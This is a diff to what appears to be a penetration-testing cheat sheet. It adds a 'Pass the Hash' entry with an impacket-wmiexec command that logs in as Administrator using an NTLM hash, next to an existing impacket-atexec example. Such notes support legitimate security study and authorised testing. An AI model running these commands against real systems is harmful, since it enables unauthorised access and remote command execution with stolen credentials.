@@ -58,6 +58,9 @@ impacket-atexec -hashes <hash:hash> <domain>/<user>@<IP> <command>
 
 # if you only have the NTLM hash portion, use :<ntlm_hash>
 ```
+## Pass the Hash
+
+```impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>```
 
 ## Overpass the Hash
 
